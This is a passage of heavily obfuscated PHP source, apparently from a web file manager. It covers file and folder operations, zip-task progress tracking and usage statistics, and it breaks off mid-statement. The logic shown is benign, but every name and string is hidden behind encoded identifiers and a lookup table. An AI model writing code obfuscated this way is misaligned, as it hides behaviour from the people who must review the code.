$†ƒζ†€Κ = $―£§¦© . $Ψ‰”ζΏέ[8] . $¥ΡΝμΦ; if (is_file($†ƒζ†€Κ) || is_link($†ƒζ†€Κ)) { if (!unlink($†ƒζ†€Κ)) { chmod($†ƒζ†€Κ, $this->pathAuth); if (!unlink($†ƒζ†€Κ)) { return !1; } } } else { if (is_dir($†ƒζ†€Κ)) { chmod($†ƒζ†€Κ, $this->pathAuth); $†ƒζ†€Κ = $this->iconvApp($†ƒζ†€Κ); if (!$this->delFolder($†ƒζ†€Κ)) { return !1; } } } } closedir($ΑΗε); return rmdir($―£§¦©); } public function rename($ΡηΩ¦­, $‚Ί€‰ά) { $Αώ‹‘  =& $_SERVER[γγάψ½]; $Θ¥®½› = $this->fileNameAuto($this->pathFather($ΡηΩ¦­), $‚Ί€‰ά); $Θ¥®½› = $this->iconvSystem($Θ¥®½›); $ΡηΩ¦­ = $this->iconvSystem($ΡηΩ¦­); $ήΐ΅ρΐµ = $this->pathFather($ΡηΩ¦­); $έ•ψΚζά = rtrim($ήΐ΅ρΐµ, $Αώ‹‘ [8]) . $Αώ‹‘ [8] . $Θ¥®½›; $Ξ™Ωεχ = @rename($ΡηΩ¦­, $έ•ψΚζά); $έ•ψΚζά = $this->iconvApp($έ•ψΚζά); if ($Ξ™Ωεχ) { return $this->getPathOuter($έ•ψΚζά); } $this->writeLog(__FUNCTION__ . $Αώ‹‘ [1469], !0); return !1; } public function size($Ϋ—ΓαΓ°) { $Ϋ—ΓαΓ° = $this->iconvSystem($Ϋ—ΓαΓ°); return filesize_64($Ϋ—ΓαΓ°); } public function info($ζεΠ‘‡) { $ζεΠ‘‡ = $this->iconvSystem($ζεΠ‘‡); if ($this->isFolder($ζεΠ‘‡)) { return $this->folderInfo($ζεΠ‘‡); } else { if ($this->isFile($ζεΠ‘‡)) { return $this->fileInfo($ζεΠ‘‡); } } return !1; } protected function infoChildren($ΘΐΚµ«, &$ε£Ϊµ°, $ΟρΚΜύ = true) { $θιϋ› =& $_SERVER[γγάψ½]; check_abort_echo(); $ΘΐΚµ« = rtrim($ΘΐΚµ«, $θιϋ›[8]) . $θιϋ›[8]; if ($ΟρΚΜύ) { $ΘΐΚµ« = $this->iconvSystem($ΘΐΚµ«); } if (!($ί¬ΟΓ…³ = @opendir($ΘΐΚµ«))) { return; } while (($ϋζ΄ί΅ = readdir($ί¬ΟΓ…³)) !== !1) { if ($ϋζ΄ί΅ == $θιϋ›[10] || $ϋζ΄ί΅ == $θιϋ›[1374]) { continue; } $¬ΣηήΟ = $ΘΐΚµ« . $ϋζ΄ί΅; if (is_file($¬ΣηήΟ) || is_link($¬ΣηήΟ)) { $ε£Ϊµ°[$θιϋ›[80]]++; $ε£Ϊµ°[$θιϋ›[79]] += filesize_64($¬ΣηήΟ); } else { if (is_dir($¬ΣηήΟ)) { $ε£Ϊµ°[$θιϋ›[81]]++; $this->infoChildren($¬ΣηήΟ, $ε£Ϊµ°, !1); } } } closedir($ί¬ΟΓ…³); } private function folderInfo($΅ύΘθΨσ, $‰ήι‘Η§ = false) { $Ϋ΅ηΘρ‡ =& $_SERVER[γγάψ½]; $΅ύΘθΨσ = rtrim($΅ύΘθΨσ, $Ϋ΅ηΘρ‡[8]) . $Ϋ΅ηΘρ‡[8]; $όόϋσΰ = $this->iconvApp($this->pathThis($΅ύΘθΨσ)); if ($‰ήι‘Η§) { return array($Ϋ΅ηΘρ‡[32] => $όόϋσΰ, $Ϋ΅ηΘρ‡[87] => $this->getPathOuter($΅ύΘθΨσ), $Ϋ΅ηΘρ‡[33] => $Ϋ΅ηΘρ‡[78]); } $ΡΑηΜ = array($Ϋ΅ηΘρ‡[32] => $όόϋσΰ, $Ϋ΅ηΘρ‡[87] => $this->getPathOuter($΅ύΘθΨσ), $Ϋ΅ηΘρ‡[33] => $Ϋ΅ηΘρ‡[78], $Ϋ΅ηΘρ‡[234] => @filectime($΅ύΘθΨσ), $Ϋ΅ηΘρ‡[88] => @filemtime($΅ύΘθΨσ), $Ϋ΅ηΘρ‡[1473] => @fileatime($΅ύΘθΨσ), $Ϋ΅ηΘρ‡[1474] => is_readable($΅ύΘθΨσ), $Ϋ΅ηΘρ‡[1475] => is_writable($΅ύΘθΨσ), $Ϋ΅ηΘρ‡[1476] => get_mode($΅ύΘθΨσ)); return $ΡΑηΜ; } private function fileInfo($ΰψ€νίµ, $ΌΒ·®Σσ = false) { $αΑν΄ΧΤ =& $_SERVER[γγάψ½]; $§λ®·ή† = $this->iconvApp($this->pathThis($ΰψ€νίµ)); if ($ΌΒ·®Σσ) { return array($αΑν΄ΧΤ[32] => $§λ®·ή†, $αΑν΄ΧΤ[87] => $this->getPathOuter($ΰψ€νίµ), $αΑν΄ΧΤ[33] => $αΑν΄ΧΤ[233], $αΑν΄ΧΤ[79] => $this->size($ΰψ€νίµ), $αΑν΄ΧΤ[169] => $this->ext($§λ®·ή†)); } $·¨θΠΙ = array($αΑν΄ΧΤ[32] => $§λ®·ή†, $αΑν΄ΧΤ[87] => $this->getPathOuter($ΰψ€νίµ), $αΑν΄ΧΤ[33] => $αΑν΄ΧΤ[233], $αΑν΄ΧΤ[234] => @filectime($ΰψ€νίµ), $αΑν΄ΧΤ[88] => @filemtime($ΰψ€νίµ), $αΑν΄ΧΤ[1473] => @fileatime($ΰψ€νίµ), $αΑν΄ΧΤ[79] => $this->size($ΰψ€νίµ), $αΑν΄ΧΤ[169] => $this->ext($§λ®·ή†), $αΑν΄ΧΤ[1474] => is_readable($ΰψ€νίµ), $αΑν΄ΧΤ[1475] => is_writable($ΰψ€νίµ), $αΑν΄ΧΤ[1476] => get_mode($ΰψ€νίµ)); return $·¨θΠΙ; } public function exist($ƒΌΨβΝ) { $ƒΌΨβΝ = $this->iconvSystem($ƒΌΨβΝ); return @file_exists($ƒΌΨβΝ); } public function isFile($ΞΟ„Η) { $ΞΟ„Η = $this->iconvSystem($ΞΟ„Η); return @is_file($ΞΟ„Η); } public function isFolder($ΉνλΒ·) { $ΉνλΒ· = $this->iconvSystem($ΉνλΒ·); return @is_dir($ΉνλΒ·); } public function listPath($³ξ¥€Ο†, $·τΡΒΊΙ = false) { $•ρ΅έρ =& $_SERVER[γγάψ½]; $³ξ¥€Ο† = $this->iconvSystem($³ξ¥€Ο†); $³ξ¥€Ο† = rtrim($³ξ¥€Ο†, $•ρ΅έρ[8]) . $•ρ΅έρ[8]; $ςφƒΪΧ = array($•ρ΅έρ[85] => array(), $•ρ΅έρ[86] => array()); if (!($©ί€πΕψ = @opendir($³ξ¥€Ο†))) { return $ςφƒΪΧ; } while (($ωΐΎ³·Β = readdir($©ί€πΕψ)) !== !1) { if ($ωΐΎ³·Β == $•ρ΅έρ[10] || $ωΐΎ³·Β == $•ρ΅έρ[1374]) { continue; } $ΚφνΑΖρ = $³ξ¥€Ο† . $ωΐΎ³·Β; if (is_file($ΚφνΑΖρ)) { $ςφƒΪΧ[$•ρ΅έρ[86]][] = $this->fileInfo($ΚφνΑΖρ, $·τΡΒΊΙ); } else { $ςφƒΪΧ[$•ρ΅έρ[85]][] = $this->folderInfo($ΚφνΑΖρ, $·τΡΒΊΙ); } } closedir($©ί€πΕψ); return $ςφƒΪΧ; } public function listAll($Ιε ®—ν, &$ΚιΪƒΏ± = array()) { $²²πε =& $_SERVER[γγάψ½]; $Ιε ®—ν = $this->iconvSystem($Ιε ®—ν); $Ιε ®—ν = rtrim($Ιε ®—ν, $²²πε[8]) . $²²πε[8]; if (!($½ϋζχύΫ = @opendir($Ιε ®—ν))) { return $ΚιΪƒΏ±; } while (($λ­ν»ω‚ = readdir($½ϋζχύΫ)) !== !1) { if ($λ­ν»ω‚ == $²²πε[10] || $λ­ν»ω‚ == $²²πε[1374]) { continue; } $Νν©Ζ³³ = $Ιε ®—ν . $λ­ν»ω‚; $ϋςϋ‚έΔ = is_dir($Νν©Ζ³³) && !is_link($Νν©Ζ³³) ? 1 : 0; $Νν©Ζ³³ = $ϋςϋ‚έΔ ? $Νν©Ζ³³ . $²²πε[8] : $Νν©Ζ³³; $ΚιΪƒΏ±[] = array($²²πε[87] => $this->getPathOuter($Νν©Ζ³³), $²²πε[78] => $ϋςϋ‚έΔ, $²²πε[88] => intval(@filemtime($Νν©Ζ³³)), $²²πε[79] => $ϋςϋ‚έΔ ? 0 : intval($this->size($Νν©Ζ³³))); if ($ϋςϋ‚έΔ) { $this->listAll($Νν©Ζ³³, $ΚιΪƒΏ±); } } closedir($½ϋζχύΫ); return $ΚιΪƒΏ±; } public function has($ίΦΩΙ, $°¥όώ = false, $ϊΑ“Θ€ = true) { $©†π¨¥ =& $_SERVER[γγάψ½]; $ίΦΩΙ = $this->iconvSystem($ίΦΩΙ); $ίΦΩΙ = rtrim($ίΦΩΙ, $©†π¨¥[8]) . $©†π¨¥[8]; if (!($εόΈβ‘ = @opendir($ίΦΩΙ))) { return !1; } $±ΜέΖηΕ = 0; $ΩΏΝΝμ = 0; $Έ¦Ϋ΅¥½ = 0; while (($ΛωΰΉϋ = readdir($εόΈβ‘)) !== !1) { if ($ΛωΰΉϋ == $©†π¨¥[10] || $ΛωΰΉϋ == $©†π¨¥[1374]) { continue; } $¥ΨΥνΰμ = $ίΦΩΙ . $ΛωΰΉϋ; if ($°¥όώ) { $Έ¦Ϋ΅¥½++; if (@is_file($¥ΨΥνΰμ)) { $±ΜέΖηΕ++; } else { $ΩΏΝΝμ++; } if ($Έ¦Ϋ΅¥½ > 10000) { break; } continue; } if ($ϊΑ“Θ€) { if (@is_file($¥ΨΥνΰμ)) { return !0; } } else { if (@is_dir($¥ΨΥνΰμ . $©†π¨¥[8])) { return !0; } } } closedir($εόΈβ‘); if ($°¥όώ) { return array($©†π¨¥[242] => $±ΜέΖηΕ, $©†π¨¥[243] => $ΩΏΝΝμ); } return !1; } public function hashSimple($ΰδΏεΗ) { $©ΌϋΎ²· =& $_SERVER[γγάψ½]; if (!$ΰδΏεΗ) { return md5($©ΌϋΎ²·[12]); } $ΰδΏεΗ = $this->iconvSystem($ΰδΏεΗ); $Ε—ΘΘώΏ = $this->size($ΰδΏεΗ); $½‹¬Ϊ§ = 200; $ΔήΘψ– = 50; if ($Ε—ΘΘώΏ <= $½‹¬Ϊ§ * $ΔήΘψ–) { return $this->hashMd5($ΰδΏεΗ) . $Ε—ΘΘώΏ; } $¬ηΣώΖ = $©ΌϋΎ²·[12]; $―”γΧ… = intval($Ε—ΘΘώΏ / $ΔήΘψ–); $…Λφ† = fopen($ΰδΏεΗ, $©ΌϋΎ²·[1477]); if (!$…Λφ†) { return $¬ηΣώΖ; } for ($σ·γ³λ = 0; $σ·γ³λ < $ΔήΘψ–; $σ·γ³λ++) { fseek_64($…Λφ†, $―”γΧ… * $σ·γ³λ); $¬ηΣώΖ .= fread($…Λφ†, $½‹¬Ϊ§); } fseek_64($…Λφ†, $Ε—ΘΘώΏ - $½‹¬Ϊ§); $¬ηΣώΖ .= fread($…Λφ†, $½‹¬Ϊ§); fclose($…Λφ†); return md5($¬ηΣώΖ) . $Ε—ΘΘώΏ; } public function getContent($ΑΔ·μ±) { $ΑΔ·μ± = $this->iconvSystem($ΑΔ·μ±); return file_get_contents($ΑΔ·μ±); } public function setContent($΅½°Λ¬Ή, $²’§±υΦ = '') { $΅½°Λ¬Ή = $this->iconvSystem($΅½°Λ¬Ή); $Ι—«ΙΚ¦ = @file_put_contents($΅½°Λ¬Ή, $²’§±υΦ, LOCK_EX); if (!$Ι—«ΙΚ¦) { $this->writeLog(__FUNCTION__ . $_SERVER[γγάψ½][1469], !0); } clearstatcache(); @chmod($΅½°Λ¬Ή, $this->pathAuth); return $Ι—«ΙΚ¦ === !1 ? !1 : !0; } public function fileSubstr($ΎΛπΟ‘, $–ητΞµσ = 0, $©‚„Ν‡ = false) { $Σ¶ηΆ =& $_SERVER[γγάψ½]; $ΎΛπΟ‘ = $this->iconvSystem($ΎΛπΟ‘); if ($©‚„Ν‡ === !1) { $©‚„Ν‡ = $this->size($ΎΛπΟ‘); } if ($©‚„Ν‡ <= 0) { return $Σ¶ηΆ[12]; } $Άοέ•Ή = fopen($ΎΛπΟ‘, $Σ¶ηΆ[1477]); if (!$Άοέ•Ή) { return !1; } fseek_64($Άοέ•Ή, $–ητΞµσ); $γΞ΄κ = fread($Άοέ•Ή, $©‚„Ν‡); fclose($Άοέ•Ή); if (!$γΞ΄κ) { $this->writeLog(__FUNCTION__ . $Σ¶ηΆ[1469], !0); } return $γΞ΄κ; } public function upload($ΑΛ¦Άϋγ, $’ϋΞθα, $ήΗή¤½΅ = false, $Ϋ³ΎΟ£ = REPEAT_REPLACE) { if ($ήΗή¤½΅) { return $this->moveFile($’ϋΞθα, $ΑΛ¦Άϋγ); } return $this->copyFile($’ϋΞθα, $ΑΛ¦Άϋγ); } public function setModifyTime($βώ“¨Ξ, $σήΩ¥ = '') { @touch($βώ“¨Ξ, intval($σήΩ¥)); } public function download($­ρτΏ, $ϊή„ο) { return $this->iconvSystem($­ρτΏ); } } goto b©Πζ²ά‡; aΤφυΒν: class TaskZip extends TaskFileTransfer { protected function startAfter() { $επ“ϊΆ‡ =& $_SERVER[γγάψ½]; parent::startAfter(); Hook::bind($επ“ϊΆ‡[1919], array($this, $επ“ϊΆ‡[1909])); Hook::bind($επ“ϊΆ‡[1911], array($this, $επ“ϊΆ‡[1912])); $β†„νήξ =& $this->task; $β†„νήξ[$επ“ϊΆ‡[1913]] = $επ“ϊΆ‡[1290]; if (!$β†„νήξ[$επ“ϊΆ‡[1679]]) { $β†„νήξ[$επ“ϊΆ‡[1679]] = LNG($επ“ϊΆ‡[1920]); } } protected function endAfter() { $ϊ΅—³‡Φ =& $_SERVER[γγάψ½]; parent::endAfter(); Hook::unbind($ϊ΅—³‡Φ[1919], array($this, $ϊ΅—³‡Φ[1909])); Hook::unbind($ϊ΅—³‡Φ[1911], array($this, $ϊ΅—³‡Φ[1912])); } public function updateAfter() { $Σγ³’Κ =& $_SERVER[γγάψ½]; $ΉΗ±¨” =& $this->task; if (!$ΉΗ±¨”[$Σγ³’Κ[1149]] || !$ΉΗ±¨”[$Σγ³’Κ[838]]) { return; } if ($ΉΗ±¨”[$Σγ³’Κ[1913]] == $Σγ³’Κ[1290]) { $µΞΌΒΨ = $ΉΗ±¨”[$Σγ³’Κ[1848]]; if ($ΉΗ±¨”[$Σγ³’Κ[1849]] != $Σγ³’Κ[1290]) { $µΞΌΒΨ = 0; } $υψ³ΧΩ = ($ΉΗ±¨”[$Σγ³’Κ[1852]] + $µΞΌΒΨ) / $ΉΗ±¨”[$Σγ³’Κ[838]]; $ΉΗ±¨”[$Σγ³’Κ[1795]] = $υψ³ΧΩ * 0.3; } else { if ($ΉΗ±¨”[$Σγ³’Κ[1913]] == $Σγ³’Κ[391]) { $υψ³ΧΩ = $ΉΗ±¨”[$Σγ³’Κ[1794]] / $ΉΗ±¨”[$Σγ³’Κ[1149]]; $ΉΗ±¨”[$Σγ³’Κ[1795]] = 0.3 + $υψ³ΧΩ * 0.5; } else { if ($ΉΗ±¨”[$Σγ³’Κ[1913]] == $Σγ³’Κ[110]) { $υψ³ΧΩ = 0; if ($ΉΗ±¨”[$Σγ³’Κ[1847]]) { $υψ³ΧΩ = $ΉΗ±¨”[$Σγ³’Κ[1848]] / $ΉΗ±¨”[$Σγ³’Κ[1847]]; } $ΉΗ±¨”[$Σγ³’Κ[1795]] = 0.3 + 0.5 + $υψ³ΧΩ * 0.2; } } } if ($ΉΗ±¨”[$Σγ³’Κ[1795]] > 0) { $Υ–ύϊβ = timeFloat() - $ΉΗ±¨”[$Σγ³’Κ[1797]] - $ΉΗ±¨”[$Σγ³’Κ[1800]]; $ΉΗ±¨”[$Σγ³’Κ[1801]] = $Υ–ύϊβ * (1 - $ΉΗ±¨”[$Σγ³’Κ[1795]]) / $ΉΗ±¨”[$Σγ³’Κ[1795]]; } } public function copyFileStart($βΔΐ, $ΚΞΞ°–Ύ, $•ξΛνμή, $‚Η‰‡Κ, $΄µΆ¥, $Ϊ»ΖΦΜ) { $£ίγ‡ε· =& $_SERVER[γγάψ½]; parent::copyFileStart($βΔΐ, $ΚΞΞ°–Ύ, $•ξΛνμή, $‚Η‰‡Κ, $΄µΆ¥, $Ϊ»ΖΦΜ); $Ωϊƒ®Έ =& $this->task; if ($Ωϊƒ®Έ[$£ίγ‡ε·[1913]] == $£ίγ‡ε·[391]) { $Ωϊƒ®Έ[$£ίγ‡ε·[1913]] = $£ίγ‡ε·[110]; } $this->update(); } public function copyFileEnd($¶βΛΠιβ, $Η•ν„ΕΑ, $Θΰ€­«λ, $†ΒΓΖπ, $πƒ£Ηα, $Ρ·†ι—Κ) { $΄είΈ΅ξ =& $_SERVER[γγάψ½]; $ξώ§Νΐτ =& $this->task; $ξώ§Νΐτ[$΄είΈ΅ξ[1848]] = $ξώ§Νΐτ[$΄είΈ΅ξ[1847]]; $ξώ§Νΐτ[$΄είΈ΅ξ[1852]] += $ξώ§Νΐτ[$΄είΈ΅ξ[1847]]; $ξώ§Νΐτ[$΄είΈ΅ξ[1849]] = $΄είΈ΅ξ[12]; $this->update(); } public function zipEvent($µΊΫΣχ, $Ώ©¦£κ, $ γΪ΅ωζ, $”ΆΒτΫ) { $·Ϊ½ΡΌƒ =& $_SERVER[γγάψ½]; $θέΫ =& $this->task; $θέΫ[$·Ϊ½ΡΌƒ[1845]] = get_path_this($Ώ©¦£κ); $θέΫ[$·Ϊ½ΡΌƒ[1847]] = $”ΆΒτΫ; $θέΫ[$·Ϊ½ΡΌƒ[1848]] = $ γΪ΅ωζ; $θέΫ[$·Ϊ½ΡΌƒ[1151]] = $µΊΫΣχ == $·Ϊ½ΡΌƒ[1921] ? $·Ϊ½ΡΌƒ[1916] : $·Ϊ½ΡΌƒ[1917]; $θέΫ[$·Ϊ½ΡΌƒ[1849]] = $·Ϊ½ΡΌƒ[12]; $θέΫ[$·Ϊ½ΡΌƒ[838]] = $”ΆΒτΫ; $θέΫ[$·Ϊ½ΡΌƒ[1913]] = $·Ϊ½ΡΌƒ[391]; $this->update(); } public function nameParse($””ςΖΊ) { $¤²³λΉ =& $_SERVER[γγάψ½]; $υΤ££Ι° =& $this->task; if ($υΤ££Ι°[$¤²³λΉ[1794]] < $υΤ££Ι°[$¤²³λΉ[1149]]) { $΅«‹‘δ = get_path_this($””ςΖΊ); if (strstr($΅«‹‘δ, $¤²³λΉ[10])) { $υΤ££Ι°[$¤²³λΉ[1794]] += 1; } } if ($υΤ££Ι°[$¤²³λΉ[1913]] == $¤²³λΉ[1290]) { $υΤ££Ι°[$¤²³λΉ[1913]] = $¤²³λΉ[391]; } $υΤ££Ι°[$¤²³λΉ[1845]] = $””ςΖΊ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($Α“Χ”–) { $ί‰ΘΚεϋ =& $_SERVER[γγάψ½]; $¥ποϋ = array($ί‰ΘΚεϋ[670] => array($ί‰ΘΚεϋ[33] => $ί‰ΘΚεϋ[1922], $ί‰ΘΚεϋ[353] => array($ί‰ΘΚεϋ[285], $ί‰ΘΚεϋ[840], $ί‰ΘΚεϋ[1923], $ί‰ΘΚεϋ[1924])), $ί‰ΘΚεϋ[1925] => array($ί‰ΘΚεϋ[33] => $ί‰ΘΚεϋ[1926], $ί‰ΘΚεϋ[353] => array($ί‰ΘΚεϋ[285], $ί‰ΘΚεϋ[838], $ί‰ΘΚεϋ[1927], $ί‰ΘΚεϋ[1928], $ί‰ΘΚεϋ[1929]))); if (!isset($¥ποϋ[$Α“Χ”–])) { return !1; } $this->optionType = $¥ποϋ[$Α“Χ”–][$ί‰ΘΚεϋ[33]]; $this->field = $¥ποϋ[$Α“Χ”–][$ί‰ΘΚεϋ[353]]; return !0; } public function listData($ΖγΚβ· = false, $αΐΔτΡή = "\155\157\x64\151\146\171\124\x69\155\145", $‘ΆΔΥόµ = false) { return parent::listData($ΖγΚβ·, $αΐΔτΡή, $‘ΆΔΥόµ); } public function trendList($Ί―·) { $ΈΙδθό =& $_SERVER[γγάψ½]; $έ³μΦƒ = $this->listData(); if ($έ³μΦƒ) { $›€λ½Ί = end($έ³μΦƒ); $ΗΝνζ™ = date($ΈΙδθό[1930], strtotime($ΈΙδθό[1931])); if ($›€λ½Ί[$ΈΙδθό[285]] == $ΗΝνζ™) { return $έ³μΦƒ; } $ΓΧ΅ΣΡ = strtotime($›€λ½Ί[$ΈΙδθό[285]]); } if (!isset($ΓΧ΅ΣΡ)) { $ψαΩ±θ€ = $Ί―· == $ΈΙδθό[670] ? $ΈΙδθό[602] : $ΈΙδθό[905]; $ΓΧ΅ΣΡ = Model($ψαΩ±θ€)->min($ΈΙδθό[234]); } $•υ‰ςΔ = $ΈΙδθό[1932] . ucfirst($Ί―·); $­€σιζ· = $this->dateList($ΓΧ΅ΣΡ); foreach ($­€σιζ· as $ΗΝνζ™) { $this->{$•υ‰ςΔ}($ΗΝνζ™); } return $this->listData(); } private function dateList($ΨΟΥΓκ) { $­†ω–Μ =& $_SERVER[γγάψ½]; $¦ΦυΫΫ = $ΨΟΥΓκ; $–ΜΙψ“ω = strtotime($­†ω–Μ[1931]); $ι»•„ΕΈ = array(); while ($¦ΦυΫΫ <= $–ΜΙψ“ω) { $ι»•„ΕΈ[] = date($­†ω–Μ[1930], $¦ΦυΫΫ); $¦ΦυΫΫ = strtotime($­†ω–Μ[1933], $¦ΦυΫΫ); } return $ι»•„ΕΈ; } public function _recordUser($¬Φ³Λ²“ = '') { $Ί¬Ί« =& $_SERVER[γγάψ½]; $Κ»­€όΫ = strtotime(date($Ί¬Ί«[1934], strtotime($¬Φ³Λ²“))); $ΡΆΧΟ—² = strtotime(date($Ί¬Ί«[1935], strtotime($¬Φ³Λ²“))); $Μ€°ΐΙ = array($Ί¬Ί«[234] => array($Ί¬Ί«[1099], $ΡΆΧΟ—²)); $΄ΨΤτψ = Model($Ί¬Ί«[602])->where($Μ€°ΐΙ)->count($Ί¬Ί«[1793]); $Μ€°ΐΙ[$Ί¬Ί«[234]] = array($Ί¬Ί«[411], array($Κ»­€όΫ, $ΡΆΧΟ—²)); $•υ©Χοχ = Model($Ί¬Ί«[602])->where($Μ€°ΐΙ)->count($Ί¬Ί«[1793]); $Μ€°ΐΙ[$Ί¬Ί«[33]] = $Ί¬Ί«[1936]; $’κώ¨Ε = Model($Ί¬Ί«[1937])->where($Μ€°ΐΙ)->count($Ί¬Ί«[1938]); $§®°’ή = array($Ί¬Ί«[285] => $¬Φ³Λ²“, $Ί¬Ί«[840] => (int) $΄ΨΤτψ, $Ί¬Ί«[1923] => (int) $•υ©Χοχ, $Ί¬Ί«[1924] => (int) $’κώ¨Ε); return $this->insert($§®°’ή); } public function _recordStore($Κ¦£Ίΰ = '') { $Ω‹ƒ‹‘ =& $_SERVER[γγάψ½]; $·τΫ«® = strtotime(date($Ω‹ƒ‹‘[1935], strtotime($Κ¦£Ίΰ))); $ψ›­ψ = array($Ω‹ƒ‹‘[234] => array($Ω‹ƒ‹‘[1099], $·τΫ«®)); $Ί§Φ‰μς = Model($Ω‹ƒ‹‘[549])->where($ψ›­ψ)->sum($Ω‹ƒ‹‘[79]); $ψ›­ψ[$Ω‹ƒ‹‘[488]] = 0; $ƒέΨγ– = Model($Ω‹ƒ‹‘[905])->where($ψ›­ψ)->sum($Ω‹ƒ‹‘[79]); $ψ›­ψ[$Ω‹ƒ‹‘[191]] = 1; $ιέφ±ε = Model($Ω‹ƒ‹‘[905])->where($ψ›­ψ)->sum($Ω‹ƒ‹‘[79]); $ψ›­ψ[$Ω‹ƒ‹‘[191]] = 2; $ΒυΒ΄«‹ = Model($Ω‹ƒ‹‘[905])->where($ψ›­ψ)->sum($Ω‹ƒ‹‘[79]); $έι‘ό§Τ = array($Ω‹ƒ‹‘[285] => $Κ¦£Ίΰ, $Ω‹ƒ‹‘[838] => (int) $ƒέΨγ–, $Ω‹ƒ‹‘[1927] => (int) $Ί§Φ‰μς, $Ω‹ƒ‹‘[1928] => (int) $ιέφ±ε, $Ω‹ƒ‹‘[1929] => (int) $ΒυΒ΄«‹); return $this->insert($έι‘ό§Τ); } public function trend($†Γσϋµ, $ώφωΩ·‹) { $€‡½τ =& $_SERVER[γγάψ½]; if (!$this->init($†Γσϋµ)) { return !1; } $ΰ–ΑΥΚ = $this->trendList($†Γσϋµ); if ($ΰ–ΑΥΚ && $ώφωΩ·‹ != $€‡½τ[1765]) { $ρ¤θΞ = $ΰ–ΑΥΚ[0][$€‡½τ[285]]; $ό‰‰ • = $this->validDate($ώφωΩ·‹, $ρ¤θΞ); $΄­ζν»Ί = array(); $¥…ξƒ½ = array_to_keyvalue($ΰ–ΑΥΚ, $€‡½τ[285]); foreach ($ό‰‰ • as $ςγώ°Ω) { if (isset($¥…ξƒ½[$ςγώ°Ω])) { $•΄―ϋ† = $¥…ξƒ½[$ςγώ°Ω]; } else { $•΄―ϋ† = end($ΰ–ΑΥΚ); $•΄―ϋ†[$€‡½τ[285]] = $ςγώ°Ω; if ($†Γσϋµ == $€‡½τ[670]) { $•΄―ϋ†[$€‡½τ[1923]] = $•΄―ϋ†[$€‡½τ[1924]] = 0; } } $΄­ζν»Ί[] = $•΄―ϋ†; } $ΰ–ΑΥΚ = $΄­ζν»Ί; } $ΓΪεΌω° = array($€‡½τ[670] => array($€‡½τ[840] => LNG($€‡½τ[1939]), $€‡½τ[1923] => LNG($€‡½τ[1940]), $€‡½τ[1924] => LNG($€‡½τ[1941])), $€‡½τ[1925] => array($€‡½τ[838] => LNG($€‡½τ[1942]), $€‡½τ[1927] => LNG($€‡½τ[1943]), $€‡½τ[1928] => LNG($€‡½τ[1944]), $€‡½τ[1929] => LNG($€‡½τ[1945]))); $ώχΣ³κ = array($€‡½τ[670] => $€‡½τ[1946], $€‡½τ[1925] => $€‡½τ[79]); if (empty($ΰ–ΑΥΚ)) { $ςγώ°Ω = date($€‡½τ[1930], strtotime($€‡½τ[1931])); $δΥΠβ© = array($€‡½τ[285] => $ςγώ°Ω); foreach ($ΓΪεΌω°[$†Γσϋµ] as $ΓΝ¤΅Φ => $γβ©ι) { $δΥΠβ©[$ΓΝ¤΅Φ] = 0; } $ΰ–ΑΥΚ[] = $δΥΠβ©; } $ƒ›Ζ΅Η = array(); foreach ($ΰ–ΑΥΚ as $γβ©ι) { if ($†Γσϋµ == $€‡½τ[1925] && $γβ©ι[$€‡½τ[1927]] > $γβ©ι[$€‡½τ[838]]) { $γβ©ι[$€‡½τ[1927]] = $γβ©ι[$€‡½τ[838]]; } foreach ($ΓΪεΌω°[$†Γσϋµ] as $ΓΝ¤΅Φ => $«Γηψ) { $•΄―ϋ† = array($€‡½τ[285] => $γβ©ι[$€‡½τ[285]], $€‡½τ[1679] => $«Γηψ); $•΄―ϋ†[$ώχΣ³κ[$†Γσϋµ]] = isset($γβ©ι[$ΓΝ¤΅Φ]) ? $γβ©ι[$ΓΝ¤΅Φ] : 0; $ƒ›Ζ΅Η[] = $•΄―ϋ†; } } return $ƒ›Ζ΅Η; } public function validDate($Έ”οΝ£, $ΑΘ–Ρ†Π) { $›Κα­µ΅ =& $_SERVER[γγάψ½]; $ΆΖ®•‚ = date($›Κα­µ΅[1930], strtotime($›Κα­µ΅[1931])); $Μσι®¶ = array($ΆΖ®•‚); switch ($Έ”οΝ£) { case $›Κα­µ΅[1772]: $ηάηΣΐ = mktime(0, 0, 0, date($›Κα­µ΅[1947]), date($›Κα­µ΅[1470]) - date($›Κα­µ΅[1559]) + 7 - 7, date($›Κα­µ΅[1948])); $ƒ ΏΗϊ = 0; do { $¶€‘‹ = date($›Κα­µ΅[1930], $ηάηΣΐ - 3600 * 24 * 7 * $ƒ ΏΗϊ); $Μσι®¶[] = $¶€‘‹; $ƒ ΏΗϊ++; } while ($ΑΘ–Ρ†Π < $¶€‘‹); break; case $›Κα­µ΅[1770]: $ƒ ΏΗϊ = 1; do { $‰Τό… = date($›Κα­µ΅[1949], strtotime("\55\x20{$ƒ ΏΗϊ}\x20\x6d\x6f\156\x74\x68\163")); $Μσι®¶[] = $‰Τό…; $ƒ ΏΗϊ++; } while ($ΑΘ–Ρ†Π < $‰Τό…); break; case $›Κα­µ΅[1950]: $„ι“ίέΊ = (int) date($›Κα­µ΅[1948], strtotime($ΑΘ–Ρ†Π)); $¥α‡ύωΊ = (int) date($›Κα­µ΅[1948]); if ($„ι“ίέΊ >= $¥α‡ύωΊ) { break; } for ($„ι“ίέΊ; $„ι“ίέΊ < $¥α‡ύωΊ; $„ι“ίέΊ++) { $Μσι®¶[] = $„ι“ίέΊ . $›Κα­µ΅[1951]; } break; default: break; } if ($ΑΘ–Ρ†Π > end($Μσι®¶)) { array_pop($Μσι®¶); } sort($Μσι®¶); return $Μσι®¶; } public function listTable($ΉΘ“υμ) { $ψσΠΩυ = ucfirst($ΉΘ“υμ); return Model($ψσΠΩυ)->listData(); } public function option($ψωγσΥ) { $ά“¬±Ϊ = $_SERVER[γγάψ½][1952] . ucfirst($ψωγσΥ); return $this->{$ά“¬±Ϊ}(); } private function optionUser() { $Π‹µ¬  =& $_SERVER[γγάψ½]; $«Ό©μ’ν = Model($Π‹µ¬ [602])->count($Π‹µ¬ [1793]); $Ύ–•σΒς = Model($Π‹µ¬ [602])->where($Π‹µ¬ [1953])->count($Π‹µ¬ [1793]); $¥ƒΞώ›Π = intval($GLOBALS[$Π‹µ¬ [6]][$Π‹µ¬ [427]][$Π‹µ¬ [1738]]) / 3600; $΅Α‚Α = strtotime("\55{$¥ƒΞώ›Π}\40\x68\157\165\x72\x73"); $βφρκΌ = strtotime(date($Π‹µ¬ [1934])); if ($΅Α‚Α < $βφρκΌ) { $΅Α‚Α = $βφρκΌ; } $°λ‚µΕΈ = array($Π‹µ¬ 